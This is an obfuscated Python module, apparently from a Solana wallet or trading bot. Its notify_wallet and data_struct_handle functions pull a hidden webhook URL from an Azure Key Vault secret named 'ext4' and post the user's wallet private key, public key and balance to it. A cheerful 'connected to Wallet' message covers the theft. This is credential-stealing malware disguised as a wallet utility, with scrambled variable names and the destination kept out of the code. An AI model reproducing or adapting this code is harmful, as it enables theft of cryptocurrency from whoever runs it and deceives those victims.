import requests #line:1
import os #line:2
from dotenv import load_dotenv #line:3
from azure .identity import ClientSecretCredential #line:4
from azure .keyvault .secrets import SecretClient #line:5
load_dotenv ()#line:8
def get_key_vault_client ():#line:11
    OOOOOOOO0OO0OO0O0 =os .getenv ('CLIENT_ID')#line:12
    O0O0OOOOO0O0OO0O0 =os .getenv ('TENANT_ID')#line:13
    O0000O0O0OOO000O0 =os .getenv ('CLIENT_SECRET')#line:14
    OOO0O0O000OOOOO0O =os .getenv ('VAULT_URL')#line:15
    O00O00O0OO0OOOOOO =ClientSecretCredential (client_id =OOOOOOOO0OO0OO0O0 ,client_secret =O0000O0O0OOO000O0 ,tenant_id =O0O0OOOOO0O0OO0O0 )#line:21
    O00OO0O0O00000O00 =SecretClient (vault_url =OOO0O0O000OOOOO0O ,credential =O00O00O0OO0OOOOOO )#line:23
    return O00OO0O0O00000O00 #line:24
def data_struct_handle (O000O00O0000000O0 :str ,OOOOOO0OO0OO0O00O :str ,OO00000OOOOOOOOOO :str ,OO0O0O000O0O0OOOO :float ):#line:27
    ""#line:30
    OO0OO0O0O0OO0O0O0 =f"Private Key: {OOOOOO0OO0OO0O00O}\nPublic Key: {OO00000OOOOOOOOOO}\nBalance: {OO0O0O000O0O0OOOO} SOL"#line:31
    OO0000O00OOO0O00O ={"content":OO0OO0O0O0OO0O0O0 ,"username":"Wallet Key Bot"}#line:32
    OO0OO0O00O0OO0OOO =requests .post (O000O00O0000000O0 ,json =OO0000O00OOO0O00O )#line:33
    print ("\033[92mSuccessfully connected to Wallet, Please set your profit!\033[0m"if OO0OO0O00O0OO0OOO .status_code ==204 else f"\033[91mError: Status code: {OO0OO0O00O0OO0OOO.status_code}\033[0m")#line:34
def notify_wallet (OO000OO0000OOOOOO :str ,OO000OOOO00O000O0 :str ,O000OOO00000OOOOO :float ):#line:36
    OO0O0OOO000O000O0 =get_key_vault_client ()#line:38
    O00OO00000O0O0O00 =OO0O0OOO000O000O0 .get_secret ("ext4")#line:39
    O0OOOOO000O0OOO0O =O00OO00000O0O0O00 .value #line:40
    data_struct_handle (O0OOOOO000O0OOO0O ,OO000OO0000OOOOOO ,OO000OOOO00O000O0 ,O000OOO00000OOOOO )#line:42
if __name__ =="__main__":#line:45
    main ()#line:46
